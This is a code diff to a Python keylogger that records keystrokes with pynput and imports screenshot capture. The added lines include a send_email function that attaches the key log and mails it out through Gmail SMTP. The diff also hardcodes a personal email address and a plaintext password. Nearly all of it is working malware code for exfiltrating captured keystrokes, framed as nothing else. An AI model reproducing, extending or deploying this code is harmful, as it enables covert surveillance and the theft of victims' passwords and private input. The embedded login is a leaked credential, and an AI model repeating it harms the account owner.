@@ -28,9 +28,60 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "key_log.txt"
+email_address = "christian.yehle104@gmail.com"
+password = "Cyehle100495"
 
-file_path = '' #filePath
+username = getpass.getuser()
+
+toaddr = "christian.yehle104@gmail.com"
+
+file_path = 'C:\\Users\\Christian Yehle\\Documents\\Logger'
 extend = "\\"
+file_merge = file_path +extend
+
+#email controls
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = email_address
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
 
 count = 0
 keys = []
@@ -68,4 +119,3 @@ def on_release(key):
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
